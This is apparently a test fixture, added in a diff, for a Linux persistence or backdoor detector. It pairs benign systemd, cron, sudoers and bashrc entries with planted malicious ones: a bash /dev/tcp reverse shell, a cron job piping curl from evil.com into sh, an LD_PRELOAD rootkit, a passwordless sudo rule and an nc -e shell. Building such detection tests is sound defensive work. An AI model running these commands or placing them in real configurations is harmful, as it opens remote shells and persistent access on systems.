@@ -1,0 +1,49 @@
+{
+  "systemd_units": [
+    {
+      "path": "/etc/systemd/system/malicious.service",
+      "exec_start": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+      "content": "[Service]\nExecStart=bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
+    },
+    {
+      "path": "/etc/systemd/system/benign.service",
+      "exec_start": "/usr/bin/python3 /opt/app/server.py",
+      "content": "[Service]\nExecStart=/usr/bin/python3 /opt/app/server.py"
+    }
+  ],
+  "cron_entries": [
+    {
+      "path": "/etc/cron.d/backdoor",
+      "line": "*/5 * * * * root curl http://evil.com/payload.sh | sh"
+    },
+    {
+      "path": "/etc/cron.d/backup",
+      "line": "0 2 * * * root /usr/local/bin/backup.sh"
+    }
+  ],
+  "ld_preload": "/home/attacker/.hidden/rootkit.so",
+  "sudoers": [
+    {
+      "path": "/etc/sudoers.d/backdoor",
+      "line": "attacker ALL=(ALL) NOPASSWD: ALL"
+    },
+    {
+      "path": "/etc/sudoers",
+      "line": "%sudo ALL=(ALL:ALL) ALL"
+    },
+    {
+      "path": "/etc/sudoers",
+      "line": "root ALL=(ALL:ALL) ALL"
+    }
+  ],
+  "bashrc_entries": [
+    {
+      "path": "/home/user/.bashrc",
+      "line": "nc 192.168.1.100 8080 -e /bin/bash &"
+    },
+    {
+      "path": "/home/user/.bashrc",
+      "line": "export PATH=\"$HOME/bin:$PATH\""
+    }
+  ]
+}
